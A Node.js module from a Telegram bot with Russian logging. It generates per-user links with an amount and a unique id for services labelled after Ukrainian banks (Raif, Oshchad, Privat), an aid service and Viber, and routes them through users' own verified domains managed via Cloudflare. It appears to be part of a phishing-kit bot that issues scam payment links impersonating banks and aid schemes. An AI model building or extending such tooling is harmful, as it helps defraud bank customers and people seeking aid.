const crypto = require('crypto');
const { applications } = require('./storage');

const serviceLinks = {
  'Допомога': 'https://t.me/dopomoga_group',
  'Райф': 'https://t.me/raif_group',
  'Ощад': 'https://t.me/oshchad_group',
  'Приват': 'https://t.me/privat_group',
  'Вайбер': 'https://t.me/viber_group',
};

const generateLink = (service, amount, userId) => {
  const userDomain = Object.entries(applications.domains || {})
    .find(([_, data]) => data.ownerId === String(userId) && data.active && data.verified)?.[0];
  const baseUrl = userDomain ? `https://${userDomain}` : (serviceLinks[service] || 'https://t.me/fallback_group');
  const id = crypto.randomUUID();
  const url = `${baseUrl}?amount=${amount}&id=${id}`;
  if (!url.startsWith('https://')) {
    console.error(`Ошибка: некорректный URL для сервиса ${service} или домена ${userDomain}: ${url}`);
    return 'https://t.me/fallback_group';
  }
  console.log(`Сгенерирована ссылка для ${userId}: ${url}`);
  return url;
};

const showServices = (ctx) => {
  console.log(`Показ списка сервисов для ${ctx.from.id}`);
  ctx.reply('Выберите сервис:', {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '1 - Допомога', callback_data: 'service_dopomoga' },
          { text: '2 - Райф', callback_data: 'service_raif' },
        ],
        [
          { text: '3 - Ощад', callback_data: 'service_oshchad' },
          { text: '4 - Приват', callback_data: 'service_privat' },
        ],
        [{ text: '5 - Вайбер', callback_data: 'service_viber' }],
      ],
    },
  });
};

const retryRequest = async (fn, maxRetries = 3, baseDelay = 1000) => {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (error.code === 429 && error.response?.parameters?.retry_after) {
        const retryAfter = error.response.parameters.retry_after * 1000;
        console.log(`[retryRequest] Ошибка 429, ждем ${retryAfter} мс перед попыткой ${attempt + 1}`);
        await new Promise((resolve) => setTimeout(resolve, retryAfter));
        continue;
      }
      console.error(`[retryRequest] Ошибка: ${error.message}, попытка ${attempt}`);
      if (attempt === maxRetries) throw error;
      await new Promise((resolve) => setTimeout(resolve, baseDelay * attempt));
    }
  }
  throw new Error(`Не удалось выполнить запрос после ${maxRetries} попыток`);
};

async function logDnsRecords(zoneId, domain, ctx, cf) {
  try {
    const records = await cf.dnsRecords.browse(zoneId);
    if (!records || !records.result) {
      await ctx.reply(`⚠️ Не удалось получить DNS-записи для ${domain}`);
      return;
    }
    let out = `📜 DNS-записи для ${domain}:\n`;
    for (const r of records.result) {
      out += `• ${r.type} ${r.name} → ${r.content} (TTL ${r.ttl})\n`;
    }
    await ctx.reply(out);
  } catch (e) {
    console.error('Ошибка чтения DNS:', e.message);
    await ctx.reply(`Ошибка получения DNS-записей: ${e.message}`);
  }
}

module.exports = { serviceLinks, generateLink, showServices, retryRequest, logDnsRecords };
